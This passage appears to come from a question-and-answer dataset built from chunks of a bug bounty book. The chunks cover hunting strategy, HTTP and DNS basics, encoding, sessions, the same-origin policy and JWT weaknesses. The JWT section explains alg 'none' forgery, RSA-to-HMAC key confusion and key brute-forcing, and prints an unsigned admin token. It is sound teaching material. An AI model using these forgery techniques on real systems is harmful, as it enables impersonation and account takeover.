sub-\nset of their assets. They run bug bounty programs to gain positive publicity\nand don’t intend to actually fix vulnerabilities. Avoid these programs to save\nyourself the headache.\n24 Chapter 2\nYou can identify these programs by reading publicly disclosed reports,\nanalyzing program statistics on bug bounty platforms, or by talking with\nother hackers. A program’s stats listed on bug bounty platforms provide\na lot of information on how well a program is executed. Avoid programs\nwith long response times and programs with low average bounties. Pick\ntargets carefully, and prioritize companies that invest in their bug bounty\nprograms.\nYou Don’t Stick to a Program\nHow long should you target a program? If your answer is a few hours or\ndays, that’s the reason you’re not finding anything. Jumping from program\nto program is another mistake beginners often make.\nEvery bug bounty program has countless bug bounty hunters hacking it.\nDifferentiate yourself from the competition, or risk not finding anything! You\ncan differentiate yourself in two ways: dig deep or search wide. For example,\ndig deep into a single functionality of an application to search for complex\nbugs. Or discover and hack the lesser-known assets of the company.\nDoing these things well takes time. Don’t expect to find bugs right away\nwhen you’re starting fresh on a program. And don’t quit a program if you\ncan’t find bugs on the first day.\nYou Don’t Recon\nJumping into big public programs without performing reconnaissance is\nanother way to fail at bug bounties. Effective recon, which we discuss in\nChapter 5, helps you discover new attack surfaces: new subdomains, new\nendpoints, and new functionality.\nSpending time on recon gives you an incredible advantage over other\nhackers, because you’ll be the first to notice the bugs on all obscure assets\nyou discover, giving you better chances of finding bugs that aren’t duplicates.\nYou Go for Only Low-Hanging Fruit\nAnother mistake that beginners often make is to rely on vulnerability scan-\nners. Companies routinely scan and audit their applications, and other bug\nbounty hunters often do the same, so this approach won’t give you good\nresults.\nAlso, avoid looking for only the obvious bug types. Simplistic bugs on\nbig targets have probably already been found. Many bug bounty programs\nwere private before companies opened them to the public. This means a\nfew experienced hackers will have already reported the easiest-to-find bugs.\nFor example, many hackers will likely have already tested for a stored-XSS\nvulnerability on a forum’s comment field.\nThis isn’t to say that you shouldn’t look for low-hanging fruit at all. Just\ndon’t get discouraged if you don’t find anything that way. Instead, strive to\ngain a deeper understanding of the application’s underlying architecture\nand logic. From there, you can develop a unique testing methodology that\nwill result in more unique and valuable bugs.\nSustaining Your Success 25\nYou Don’t Get into Private Programs\nIt becomes much easier to find bugs after you start hacking on private pro-\ngrams. Many successful hackers say that most of their findings come from\nprivate programs. Private programs are a lot less crowded than public ones,\nso you’ll have less competition, and less competition usually means more\neasy finds and fewer duplicates.\nWhy Your Reports Get Dismissed\nAs mentioned, three types of reports won’t result in a bounty: N/As, infor-\nmatives, and duplicates. In this section, I’ll talk about what you can do to\nreduce these disappointments.\nReducing the number of invalid reports benefits everyone. It will not\nonly save you time and effort, but also save the security team the staff hours\ndedicated to processing these reports. Here are some reasons your reports\nkeep getting dismissed.\nYou Don’t Read the Bounty Policy\nOne of the most common reasons reports get marked as N/A is that they’re\nout of scope. A program’s policy page often has a section labeled Scope that\ntells you which of the company’s assets you’re allowed to hack. Most of the\ntime, the policy page also lists vulnerabilities and assets that are out of scope,\nmeaning you’re not allowed to report about them.\nThe best way to prevent submitting N/As is to read the bounty policy\ncarefully and repeatedly. Which vulnerability types are out of scope? And\nwhich of the organization’s assets? Respect these boundaries, and don’t sub-\nmit bugs that are out of scope.\nIf you do accidentally find a critical issue that is out of scope, report it if\nyou think it’s something that the organization has to know about! You might\nnot get rewarded, but you can still contribute to the company’s security.\nYou Don’t Put Yourself in the Organization’s Shoes\nInformative reports are much harder to prevent than N/As. Most of the time,\nyou’ll get informative ratings because the company doesn’t care about the\nissue you’re reporting.\nImagine yourself as a security engineer. If you’re busy safeguarding mil-\nlions of users’ data every day, would you care about an open redirect that can\nbe used only for phishing? Although it’s a valid security flaw, you probably\nwouldn’t. You have other responsibilities to tend to, so fixing a low-severity\nbug is at the bottom of your to-do list. If the security team does not have the\nextra staff to deal with these reports, they will sometimes ignore it and mark\nit as informative.\nI’ve found that the most helpful way to reduce informatives is to put\nmyself in the organization’s shoes. Learn about the organization so you can\nidentify its product, the data it’s protecting, and the parts of its application\nthat are the most important. Once you know the business’s priorities, you\ncan go after the vulnerabilities that the security team cares about.\n26 Chapter 2\nAnd remember, different companies have different priorities. An\ninformative report to one organization could be a critical one to another.\nLike the dating site versus job search site example mentioned earlier in\nthis chapter, everything is relative. Sometimes, it’s difficult to figure out\nhow important a bug will be to an organization. Some issues I’ve reported\nas critical ended up being informative. And some vulnerabilities I classi-\nfied as low impact were rewarded as critical issues.\nThis is where trial and error can pay off. Every time the security team\nclassifies your report as informative, take note for future reference. The\nnext time you find a bug, ask yourself: did this company care about issues\nlike this in the past? Learn what each company cares about, and tailor your\nhacking efforts to suit their business priorities. You’ll eventually develop an\nintuition about what kinds of bugs deliver the most impact.\nYou Don’t Chain Bugs\nYou might also be getting informatives because you always report the first\nminor bug you find.\nBut minor bugs classified as informative can become big issues if\nyou learn to chain them. When you find a low-severity bug that might get\ndismissed, don’t report it immediately. Try to use it in future bug chains\ninstead. For example, instead of reporting an open redirect, use it in a\nserver-side request forgery (SSRF) attack!\nYou Write Bad Reports\nAnother mistake beginners often make is that they fail to communicate the\nbug’s impact in their report. Even when a vulnerability is impactful, if you\ncan’t communicate its implications to the security team, they’ll dismiss the\nreport.\nWhat About Duplicates?\nUnfortunately, sometimes you can’t avoid duplicates. But you could lower\nyour chances of getting duplicates by hunting on programs with large\nscopes, hacking on private programs, performing recon extensively, and\ndeveloping your unique hunting methodology.\nWhat to Do When You’re Stuck\nWhen I got started in bug bounties, I often went days or weeks without find-\ning a single vulnerability. My first-ever target was a social media site with\na big scope. But after reporting my first CSRFs and IDORs, I soon ran out\nof ideas (and luck). I started checking for the same vulnerabilities over and\nover again, and trying out different automatic tools, to no avail.\nI later found out I wasn’t alone; this type of bug slump is surprisingly\ncommon among new hackers. Let’s talk about how you can bounce back\nfrom frustration and improve your results when you get stuck.\nSustaining Your Success 27\nStep 1: Take a Break!\nFirst, take a break. Hacking is hard work. Unlike what they show in the mov-\nies, hunting for vulnerabilities is tedious and difficult. It requires patience,\npersistence, and an eye for detail, so it can be very mentally draining.\nBefore you keep hacking away, ask yourself: am I tired? A lack of inspira-\ntion could be your brain’s way of telling you it has reached its limits. In this\ncase, your best course of action would be to rest it out. Go outside. Meet up\nwith friends. Have some ice cream. Or stay inside. Make some tea. And read\na good book.\nThere is more to life than SQL injections and XSS payloads. If you take\na break from hacking, you’ll often find that you’re much more creative when\nyou come back.\nStep 2: Build Your Skill Set\nUse your hacking slump as an opportunity to improve your skills. Hackers\noften get stuck because they get too comfortable with certain familiar tech-\nniques, and when those techniques don’t work anymore, they mistakenly\nassume there’s nothing left to try. Learning new skills will get you out of\nyour comfort zone and strengthen your hacker skills for the future.\nFirst, if you’re not already familiar with the basic hacking techniques,\nrefer to testing guides and best practices to solidify your skills. For example,\nthe Open Web Application Security Project (OWASP) has published testing guides\nfor various asset types. You can find OWASP’s web and mobile testing\nguides at https://owasp.org/www-project-web-security-testing-guide/ and https://\nowasp.org/www-project-mobile-security-testing-guide/.\nLearn a new hacking technique, whether it’s a new web exploitation tech-\nnique, a new recon angle, or a different platform, such as Android. Focus on a\nspecific skill you want to build, read about it, and apply it to the targets you’re\nhacking. Who knows? You might uncover a whole new way to approach the\ntarget application! You can also take this opportunity to catch up with what\nother hackers are doing by reading the many hacker blogs and write-up sites\nout there. Understanding other hackers’ approaches can provide you with a\nrefreshing new perspective on engaging with your target.\nNext, play Capture the Flags (CTFs). In these security competitions, play-\ners search for flags that prove that they’ve hacked into a system. CTFs are\na great way to learn about new vulnerabilities. They’re also fun and often\nfeature interesting new classes of vulnerabilities. Researchers are constantly\ndiscovering new kinds of exploit techniques, and staying on top of these\ntechniques will ensure that you’re constantly finding bugs.\nStep 3: Gain a Fresh Perspective\nWhen you’re ready to hack live targets again, here are some tips to help you\nkeep your momentum.\n28 Chapter 2\nFirst, hacking on a single target can get boring, so diversify your targets\ninstead of focusing on only one. I’ve always found it helpful to have a few\ntargets to alternate between. When you’re getting tired of one application,\nswitch to another, and come back to the first one later.\nSecond, make sure you’re looking for specific things in a target instead\nof wandering aimlessly, searching for anything. Make a list of the new skills\nyou’ve learned and try them out. Look for a new kind of bug, or try out a new\nrecon angle. Then, rinse and repeat until you find a suitable new workflow.\nFinally, remember that hacking is not always about finding a single vul-\nnerability but combining several weaknesses of an application into something\ncritical. In this case, it’s helpful to specifically look for weird behavior instead\nof vulnerabilities. Then take note of these weird behaviors and weaknesses,\nand see if you can chain them into something worth reporting.\nLastly, a Few Words of Experience\nBug bounty hunting is difficult. When I started hunting for bugs, I’d some-\ntimes go months without finding one. And when I did find one, it’d be\nsomething trivial and low severity.\nThe key to getting better at anything is practice. If you’re willing to put\nin the time and effort, your hacking skills will improve, and you’ll soon see\nyourself on leaderboards and private invite lists! If you get frustrated during\nthis process, remember that everything gets easier over time. Reach out to\nthe hacker community if you need help. And good luck!\nSustaining Your Success 29",
    "question": "What are the key steps and considerations for writing a clear, effective vulnerability report and building a positive relationship with the security team in a bug bounty program?",
    "summary": "To sustain success in bug bounty programs, focus on writing clear, detailed reports that explain vulnerabilities, include steps to reproduce, and describe potential impacts. Building strong relationships with security teams through professionalism and respect is crucial for smooth resolution and better payouts. Additionally, understand the organization's priorities, avoid common pitfalls like targeting the wrong programs or only looking for obvious bugs, and use your findings to chain vulnerabilities for greater impact. Finally, stay persistent, keep learning, and take breaks when needed to maintain creativity and effectiveness in your bug hunting efforts."
  },
  {
    "start": 30,
    "end": 33,
    "text": "3\nHOW THE INTERNET WORKS\nBefore you jump into hunting for bugs, let’s\ntake some time to understand how the inter-\nnet works. Finding web vulnerabilities is all\nabout exploiting weaknesses in this technology,\nso all good hackers should have a solid understanding\nof it. If you’re already familiar with these processes, feel\nfree to skip ahead to my discussion of the internet’s\nsecurity controls.\nThe following question provides a good starting place: what happens\nwhen you enter www.google.com in your browser? In other words, how does\nyour browser know how to go from a domain name, like google.com, to the\nweb page you’re looking for? Let’s find out.\nThe Client-Server Model\nThe internet is composed of two kind of devices: clients and servers. Clients\nrequest resources or services, and servers provide those resources and ser-\nvices. When you visit a website with your browser, it acts as a client and\nrequests a web page from a web server. The web server will then send your\nbrowser the web page (Figure 3-1).\nRequests resources\nBrowser (client) Web server\nProvides resources\nFigure 3-1: Internet clients request resources from servers.\nA web page is nothing more than a collection of resources or files sent by\nthe web server. For example, at the very least, the server will send your browser\na text file written in Hypertext Markup Language (HTML), the language that\ntells your browser what to display. Most web pages also include Cascading Style\nSheets (CSS) files to make them pretty. Sometimes web pages also contain\nJavaScript (JS) files, which enable sites to animate the web page and react\nto user input without going through the server. For example, JavaScript\ncan resize images as users scroll through the page and validate a user input\non the client side before sending it to the server. Finally, your browser might\nreceive embedded resources, such as images and videos. Your browser will\ncombine these resources to display the web page you see.\nServers don’t just return web pages to the user, either. Web APIs enable\napplications to request the data of other systems. This enables applications\nto interact with each other and share data and resources in a controlled\nway. For example, Twitter’s APIs allow other websites to send requests to\nTwitter’s servers to retrieve data such as lists of public tweets and their\nauthors. APIs power many internet functionalities beyond this, and we’ll\nrevisit them, along with their security issues, in Chapter 24.\nThe Domain Name System\nHow do your browser and other web clients know where to find these\nresources? Well, every device connected to the internet has a unique\nInternet Protocol (IP) address that other devices can use to find it. However,\nIP addresses are made up of numbers and letters that are hard for humans\nto remember. For example, the older format of IP addresses, IPv4, looks\nlike this: 123.45.67.89. The new version, IPv6, looks even more compli-\ncated: 2001:db8::ff00:42:8329.\n34 Chapter 3\nThis is where the Domain Name System (DNS) comes in. A DNS server func-\ntions as the phone book for the internet, translating domain names into\nIP addresses (Figure 3-2). When you enter a domain name in your browser,\na DNS server must first convert the domain name into an IP address. Our\nbrowser asks the DNS server, “Which IP address is this domain located at?”\nHey, where is www.google.com?\nDNS server\nIt’s at 216.58.192.132.\nGive me Google, please.\nWeb browser\nYour browser\n216.58.192.132\nYeah, sure. Here you go!\nFigure 3-2: A DNS server will translate a domain name to an IP address.\nInternet Ports\nAfter your browser acquires the correct IP address, it will attempt to con-\nnect to that IP address via a port. A port is a logical division on devices that\nidentifies a specific network service. We identify ports by their port num-\nbers, which can range from 0 to 65,535.\nPorts allow a server to provide multiple services to the internet at the\nsame time. Because conventions exist for the traffic received on certain ports,\nport numbers also allow the server to quickly forward arriving internet mes-\nsages to a corresponding service for processing. For example, if an internet\nclient connects to port 80, the web server understands that the client wishes\nto access its web services (Figure 3-3).\nPort 80 – HTTP service\nConnect to port 80\nBrowser (client) Web server Port 25 – Email service\nPort 21 – FTP service\nFigure 3-3: Ports allow servers to provide multiple services. Port numbers help forward client requests to the\nright service.\nBy default, we use port 80 for HTTP messages and port 443 for HTTPS,\nthe encrypted version of HTTP.\nHow the Internet Works 35\nHTTP Requests and Responses\nOnce a connection is established, the browser and server communicate via\nthe HyperText Transfer Protocol (HTTP). HTTP is a set of rules that specifies\nhow to structure and interpret internet messages, and how web clients and\nweb servers should exchange information.\nWhen your browser wants to interact with a server, it sends the server an\nHTTP request. There are different types of HTTP requests, and the two\nmost common are GET and POST. By convention, GET requests retrieve\ndata from the server, while POST requests submit data to it. Other common\nHTTP methods include OPTIONS, used to request permitted HTTP meth-\nods for a given URL; PUT, used to update a resource; and DELETE, used to\ndelete a resource.\nHere is an example GET request that asks the server for the home page\nof www.google.com:\nGET / HTTP/1.1\nHost: www.google.com\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml\nAccept-Language: en-US\nAccept-Encoding: gzip, deflate\nConnection: close\nLet’s walk through the structure of this request, since you’ll be seeing a\nlot of these in this book. All HTTP requests are composed of a request line,\nrequest headers, and an optional request body. The preceding example\ncontains only the request line and headers.\nThe request line is the first line of the HTTP request. It specifies the\nrequest method, the requested URL, and the version of HTTP used. Here,\nyou can see that the client is sending an HTTP GET request to the home\npage of www.google.com using HTTP version 1.1.\nThe rest of the lines are HTTP request headers. These are used to pass\nadditional information about the request to the server. This allows the server\nto customize results sent to the client. In the preceding example, the Host\nheader specifies the hostname of the request. The User-Agent header contains\nthe operating system and software version of the requesting software, such\nas the user’s web browser. The Accept, Accept-Language, and Accept-Encoding\nheaders tell the server which format the responses should be in. And the\nConnection header tells the server whether the network connection should\nstay open after the server responds.\nYou might see a few other common headers in requests. The Cookie header\nis used to send cookies from the client to the server. The Referer header speci-\nfies the address of the previous web page that linked to the current page. And\nthe Authorization header contains credentials to authenticate a user to a server.\nAfter the server receives the request, it will try to fulfill it. The server\nwill return all the resources used to construct your web page by using HTTP\nresponses. An HTTP response contains multiple things: an HTTP status\ncode to indicate whether the request succeeded; HTTP headers, which are\n36 Chapter 3\nbits of information that browsers and servers use to communicate with each\nother about authentication, content format, and security policies; and the\nHTTP response body, or the actual web content that you requested. The\nweb content could include HTML code, CSS style sheets, JavaScript code,\nimages, and more.\nHere is an example of an HTTP response:\n1 HTTP/1.1 200 OK\n2 Date: Tue, 31 Aug 2021 17:38:14 GMT\n[...]\n3 Content-Type: text/html; charset=UTF-8\n4 Server: gws\n5 Content-Length: 190532\n<!doctype html>\n[...]\n<title>Google</title>\n[...]\n<html>\nNotice the 200 OK message on the first line 1. This is the status code.\nAn HTTP status code in the 200 range indicates a successful request. A sta-\ntus code in the 300 range indicates a redirect to another page, whereas the\n400 range indicates an error on the client’s part, like a request for a non-\nexistent page. The 500 range means that the server itself ran into an error.\nAs a bug bounty hunter, you should always keep an eye on these status\ncodes, because they can tell you a lot about how the server is operating. For\nexample, a status code of 403 means that the resource is forbidden to you.\nThis might mean that sensitive data is hidden on the page that you could\nreach if you can bypass the access controls.\nThe next few lines separated by a colon (:) in the response are the\nHTTP response headers. They allow the server to pass additional informa-\ntion about the response to the client. In this case, you can see that the time\nof the response was Tue, 31 Aug 2021 17:38:14 GMT 2. The Content-Type header\nindicates the file type of the response body. In this case, The Content-Type of\nthis page is text/html 3. The server version is Google Web Server (gws) 4,\nand the Content-Length is 190,532 bytes 5. Usually, additional response head-\ners will specify the content’s format, language, and security policies.\nIn addition to these, you might encounter a few other common\nresponse headers. The Set-Cookie header is sent by the server to the client\nto set a cookie. The Location header indicates the URL to which to redirect\nthe page. The Access-Control-Allow-Origin header indicates which origins\ncan access the page’s content. (We will talk about this more in Chapter 19.)\nContent-Security-Policy controls the origin of the resources the browser is\nallowed to load, while the X-Frame-Options header indicates whether the page\ncan be loaded within an iframe (discussed further in Chapter 8).\nThe data after the blank line is the response body. It contains the actual\ncontent of the web page, such as the HTML and JavaScript code. Once your\nbrowser receives all the information needed to construct the web page, it will\nrender everything for you.\nHow the Internet Works 37",
    "question": "What is the process by which a browser translates a domain name like www.google.com into an IP address and retrieves the corresponding web page?",
    "summary": "The internet operates using a client-server model where browsers request resources from servers. When you enter a domain name, the DNS system translates it into an IP address, allowing the browser to connect to the correct server. Once connected, HTTP requests and responses are used to retrieve and send web content, with status codes indicating the success or failure of the request. Servers also use ports to manage multiple services and APIs to share data between systems."
  },
  {
    "start": 34,
    "end": 39,
    "text": "Internet Security Controls\nNow that you have a high-level understanding of how information is com-\nmunicated over the internet, let’s dive into some fundamental security\ncontrols that protect it from attackers. To hunt for bugs effectively, you will\noften need to come up with creative ways to bypass these controls, so you’ll\nfirst need to understand how they work.\nContent Encoding\nData transferred in HTTP requests and responses isn’t always transmitted\nin the form of plain old text. Websites often encode their messages in dif-\nferent ways to prevent data corruption.\nData encoding is used as a way to transfer binary data reliably across\nmachines that have limited support for different content types. Characters\nused for encoding are common characters not used as controlled characters\nin internet protocols. So when you encode content using common encoding\nschemes, you can be confident that your data is going to arrive at its desti-\nnation uncorrupted. In contrast, when you transfer your data in its original\nstate, the data might be screwed up when internet protocols misinterpret\nspecial characters in the message.\nBase64 encoding is one of the most common ways of encoding data. It’s\noften used to transport images and encrypted information within web mes-\nsages. This is the base64-encoded version of the string \"Content Encoding\":\nQ29udGVudCBFbmNvZGluZw==\nBase64 encoding’s character set includes the uppercase alphabet charac-\nters A to Z, the lowercase alphabet characters a to z, the number characters 0\nto 9, the characters + and /, and finally, the = character for padding. Base64url\nencoding is a modified version of base64 used for the URL format. It’s simi-\nlar to base64, but uses different non-alphanumeric characters and omits\npadding.\nAnother popular encoding method is hex encoding. Hexadecimal encod-\ning, or hex, is a way of representing characters in a base-16 format, where\ncharacters range from 0 to F. Hex encoding takes up more space and is less\nefficient than base64 but provides for a more human-readable encoded\nstring. This is the hex-encoded version of the string \"Content Encoding\"; you\ncan see that it takes up more characters than its base64 counterpart:\n436f6e74656e7420456e636f64696e67\nURL encoding is a way of converting characters into a format that is more\neasily transmitted over the internet. Each character in a URL-encoded\nstring can be represented by its designated hex number preceded by a %\nsymbol. See Wikipedia for more information about URL encoding: https://\nen.wikipedia.org/wiki/Percent-encoding.\nFor example, the word localhost can be represented with its URL-encoded\nequivalent, %6c%6f%63%61%6c%68%6f%73%74. You can calculate a hostname’s\n38 Chapter 3\nURL-encoded equivalent by using a URL calculator like URL Decode and\nEncode (https://www.urlencoder.org/).\nWe’ll cover a couple of additional types of character encoding—octal\nencoding and dword encoding—when we discuss SSRFs in Chapter 13. When\nyou see encoded content while investigating a site, always try to decode it to\ndiscover what the website is trying to communicate. You can use Burp Suite’s\ndecoder to decode encoded content. We’ll cover how to do this in the next\nchapter. Alternatively, you can use CyberChef (https://gchq.github.io/CyberChef/)\nto decode both base64 content and other types of encoded content.\nServers sometimes also encrypt their content before transmission. This\nkeeps the data private between the client and server and prevents anyone\nwho intercepts the traffic from eavesdropping on the messages.\nSession Management and HTTP Cookies\nWhy is it that you don’t have to re-log in every time you close your email\ntab? It’s because the website remembers your session. Session management is a\nprocess that allows the server to handle multiple requests from the same\nuser without asking the user to log in again.\nWebsites maintain a session for each logged-in user, and a new session\nstarts when you log in to the website (Figure 3-4). The server will assign an\nassociated session ID for your browser that serves as proof of your identity.\nThe session ID is usually a long and unpredictable sequence designed to\nbe unguessable. When you log out, the server ends the session and revokes\nthe session ID. The website might also end sessions periodically if you don’t\nmanually log out.\nLog in username “vickieli” please.\nBrowser Server\nSure, your session ID is “@yJT$U4lx6F2QZx.”\nFigure 3-4: After you log in, the server creates a session for you and issues a session ID,\nwhich uniquely identifies a session.\nMost websites use cookies to communicate session information in\nHTTP requests. HTTP cookies are small pieces of data that web servers send\nto your browser. When you log in to a site, the server creates a session for\nyou and sends the session ID to your browser as a cookie. After receiving a\ncookie, your browser stores it and includes it in every request to the same\nserver (Figure 3-5).\nThat’s how the server knows it’s you! After the cookie for the session is\ngenerated, the server will track it and use it to validate your identity. Finally,\nHow the Internet Works 39\nwhen you log out, the server will invalidate the session cookie so that it can-\nnot be used again. The next time you log in, the server will create a new ses-\nsion and a new associated session cookie for you.\nDisplay my messages please. My session ID is “@yJT$U4lx6F2QZx.”\nBrowser Sure, you must be vickieli. Server\nYou have 2 new messages.\nFigure 3-5: Your session ID correlates with session information that is stored on the server.\nToken-Based Authentication\nIn session-based authentication, the server stores your information and uses a\ncorresponding session ID to validate your identity, whereas a token-based authen-\ntication system stores this info directly in some sort of token. Instead of storing\nyour information server-side and querying it using a session ID, tokens allow\nservers to deduce your identity by decoding the token itself. This way, applica-\ntions won’t have to store and maintain session information server-side.\nThis system comes with a risk: if the server uses information contained in\nthe token to determine the user’s identity, couldn’t users modify the informa-\ntion in the tokens and log in as someone else? To prevent token forgery attacks\nlike these, some applications encrypt their tokens, or encode the token so that\nit can be read by only the application itself or other authorized parties. If the\nuser can’t understand the contents of the token, they probably can’t tamper\nwith it effectively either. Encrypting or encoding a token does not prevent\ntoken forgery completely. There are ways that an attacker can tamper with\nan encrypted token without understanding its contents. But it’s a lot more\ndifficult than tampering with a plaintext token. Attackers can often decode\nencoded tokens to tamper with them.\nAnother more reliable way applications protect the integrity of a token is\nby signing the token and verifying the token signature when it arrives at the\nserver. Signatures are used to verify the integrity of a piece of data. They are\nspecial strings that can be generated only if you know a secret key. Since there\nis no way of generating a valid signature without the secret key, and only the\nserver knows what the secret key is, a valid signature suggests that the token is\nprobably not altered by the client or any third party. Although the implemen-\ntations by applications can vary, token-based authentication works like this:\n1. The user logs in with their credentials.\n2. The server validates those credentials and provides the user with a\nsigned token.\n40 Chapter 3\n3. The user sends the token with every request to prove their identity.\n4. Upon receiving and validating the token, the server reads the user’s iden-\ntity information from the token and responds with confidential data.\nJSON Web Tokens\nThe JSON Web Token (JWT) is one of the most commonly used types of\nauthentication tokens. It has three components: a header, a payload, and a\nsignature.\nThe header identifies the algorithm used to generate the signature. It’s\na base64url-encoded string containing the algorithm name. Here’s what a\nJWT header looks like:\neyBhbGcgOiBIUzI1NiwgdHlwIDogSldUIH0K\nThis string is the base64url-encoded version of this text:\n{ \"alg\" : \"HS256\", \"typ\" : \"JWT\" }\nThe payload section contains information about the user’s identity. This\nsection, too, is base64url encoded before being used in the token. Here’s an\nexample of the payload section, which is the base64url-encoded string of\n{ \"user_name\" : \"admin\", }:\neyB1c2VyX25hbWUgOiBhZG1pbiB9Cg\nFinally, the signature section validates that the user hasn’t tampered with\nthe token. It’s calculated by concatenating the header with the payload, then\nsigning it with the algorithm specified in the header, and a secret key. Here’s\nwhat a JWT signature looks like:\n4Hb/6ibbViPOzq9SJflsNGPWSk6B8F6EqVrkNjpXh7M\nFor this specific token, the signature was generated by signing the\nstring eyBhbGcgOiBIUzI1NiwgdHlwIDogSldUIH0K.eyB1c2VyX25hbWUgOiBhZG1pbiB9Cg\nwith the HS256 algorithm using the secret key key. The complete token\nconcatenates each section (the header, payload, and signature), separating\nthem with a period (.):\neyBhbGcgOiBIUzI1NiwgdHlwIDogSldUIH0K.eyB1c2VyX25hbWUgOiBhZG1pbiB9Cg.4Hb/6ibbVi\nPOzq9SJflsNGPWSk6B8F6EqVrkNjpXh7M\nWhen implemented correctly, JSON web tokens provide a secure way to\nidentify the user. When the token arrives at the server, the server can verify\nthat the token has not been tampered with by checking that the signature\nis correct. Then the server can deduce the user’s identity by using the infor-\nmation contained in the payload section. And since the user does not have\naccess to the secret key used to sign the token, they cannot alter the payload\nand sign the token themselves.\nHow the Internet Works 41\nBut if implemented incorrectly, there are ways that an attacker can\nbypass the security mechanism and forge arbitrary tokens.\nManipulating the alg Field\nSometimes applications fail to verify a token’s signature after it arrives at\nthe server. This allows an attacker to simply bypass the security mechanism\nby providing an invalid or blank signature.\nOne way that attackers can forge their own tokens is by tampering with\nthe alg field of the token header, which lists the algorithm used to encode the\nsignature. If the application does not restrict the algorithm type used in the\nJWT, an attacker can specify which algorithm to use, which could compro-\nmise the security of the token.\nJWT supports a none option for the algorithm type. If the alg field is set\nto none, even tokens with empty signature sections would be considered valid.\nConsider, for example, the following token:\neyAiYWxnIiA6ICJOb25lIiwgInR5cCIgOiAiSldUIiB9Cg.eyB1c2VyX25hbWUgOiBhZG1pbiB9Cg.\nThis token is simply the base64url-encoded versions of these two blobs,\nwith no signature present:\n{ \"alg\" : \"none\", \"typ\" : \"JWT\" } { \"user\" : \"admin\" }\nThis feature was originally used for debugging purposes, but if not\nturned off in a production environment, it would allow attackers to forge\nany token they want and impersonate anyone on the site.\nAnother way attackers can exploit the alg field is by changing the type\nof algorithm used. The two most common types of signing algorithms used\nfor JWTs are HMAC and RSA. HMAC requires the token to be signed with\na key and then later verified with the same key. When using RSA, the token\nwould first be created with a private key, then verified with the correspond-\ning public key, which anyone can read. It is critical that the secret key for\nHMAC tokens and the private key for RSA tokens be kept a secret.\nNow let’s say that an application was originally designed to use RSA\ntokens. The tokens are signed with a private key A, which is kept a secret\nfrom the public. Then the tokens are verified with public key B, which is\navailable to anyone. This is okay as long as the tokens are always treated as\nRSA tokens. Now if the attacker changes the alg field to HMAC, they might\nbe able to create valid tokens by signing the forged tokens with the RSA\npublic key, B. When the signing algorithm is switched to HMAC, the token\nis still verified with the RSA public key B, but this time, the token can be\nsigned with the same public key too.\nBrute-Forcing the Key\nIt could also be possible to guess, or brute-force, the key used to sign a JWT.\nThe attacker has a lot of information to start with: the algorithm used to\nsign the token, the payload that was signed, and the resulting signature. If\n42 Chapter 3\nthe key used to sign the token is not complex enough, they might be able\nto brute-force it easily. If an attacker is not able to brute-force the key, they\nmight try leaking the secret key instead. If another vulnerability, like a\ndirectory traversal, external entity attack (XXE), or SSRF exists that allows\nthe attacker to read the file where the key value is stored, the attacker can\nsteal the key and sign arbitrary tokens of their choosing. We’ll talk about\nthese vulnerabilities in later chapters.\nReading Sensitive Information\nSince JSON web tokens are used for access control, they often contain\ninformation about the user. If the token is not encrypted, anyone can\nbase64-decode the token and read the token’s payload. If the token con-\ntains sensitive information, it might become a source of information leaks.\nA properly implemented signature section of the JSON web token provides\ndata integrity, not confidentiality.\nThese are just a few examples of JWT security issues. For more examples of\nJWT vulnerabilities, use the search term JWT security issues. The security of any\nauthentication mechanism depends not only on its design, but also its imple-\nmentation. JWTs can be secure, but only if implemented properly.\nThe Same-Origin Policy\nThe same-origin policy (SOP) is a rule that restricts how a script from one ori-\ngin can interact with the resources of a different origin. In one sentence,\nthe SOP is this: a script from page A can access data from page B only if the\npages are of the same origin. This rule protects modern web applications\nand prevents many common web vulnerabilities.\nTwo URLs are said to have the same origin if they share the same pro-\ntocol, hostname, and port number. Let’s look at some examples. Page A is\nat this URL:\nhttps://medium.com/@vickieli\nIt uses HTTPS, which, remember, uses port 443 by default. Now look\nat the following pages to determine which has the same origin as page A,\naccording to the SOP:\nhttps://medium.com/\nhttp://medium.com/\nhttps://twitter.com/@vickieli7\nhttps://medium.com:8080/@vickieli\nThe https://medium.com/ URL is of the same origin as page A, because\nthe two pages share the same origin, protocol, hostname, and port num-\nber. The other three pages do not share the same origin as page A. http://\nmedium.com/ is of a different origin from page A, because their protocols\ndiffer. https://medium.com/ uses HTTPS, whereas http://medium.com/ uses\nHow the Internet Works 43\nHTTP. https://twitter.com/@vickieli7 is of a different origin as well, because\nit has a different hostname. Finally, https://medium.com:8080/@vickieli is of a\ndifferent origin because it uses port 8080, instead of port 443.\nNow let’s consider an example to see how SOP protects us. Imagine that\nyou’re logged in to your banking site at onlinebank.com. Unfortunately, you\nclick on a malicious site, attacker.com, in the same browser.\nThe malicious site issues a GET request to onlinebank.com to retrieve\nyour personal information. Since you’re logged into the bank, your\nbrowser automatically includes your cookies in every request you send to\nonlinebank.com, even if the request is generated by a script on a malicious\nsite. Since the request contains a valid session ID, the server of onlinebank\n.com fulfills the request by sending the HTML page containing your info.\nThe malicious script then reads and retrieves the private email addresses,\nhome addresses, and banking information contained on the page.\nLuckily, the SOP will prevent the malicious script hosted on attacker.com\nfrom reading the HTML data returned from onlinebank.com. This keeps the\nmalicious script on page A from obtaining sensitive information embedded\nwithin page B.\nLearn to Program\nYou should now have a solid background to help you understand most of\nthe vulnerabilities we will cover. Before you set up your hacking tools, I\nrecommend that you learn to program. Programming skills are helpful,\nbecause hunting for bugs involves many repetitive tasks, and by learning\na programming language such as Python or shell scripting, you can auto-\nmate these tasks to save yourself a lot of time.\nYou should also learn to read JavaScript, the language with which most\nsites are written. Reading the JavaScript of a site can teach you about how\nit works, giving you a fast track to finding bugs. Many top hackers say that\ntheir secret sauce is that they read JavaScript and search for hidden end-\npoints, insecure programming logic, and secret keys. I’ve also found many\nvulnerabilities by reading JavaScript source code.\nCodecademy is a good resource for learning how to program. If you\nprefer to read a book instead, Learn Python the Hard Way by Zed Shaw\n(Addison-Wesley Professional, 2013) is a great way to learn Python. And\nreading Eloquent JavaScript, Third Edition, by Marijn Haverbeke (No\nStarch Press, 2019) is one of the best ways to master JavaScript.\n44 Chapter 3",
    "question": "What are the key security controls discussed in the text and how do they help protect data and user sessions on the internet?",
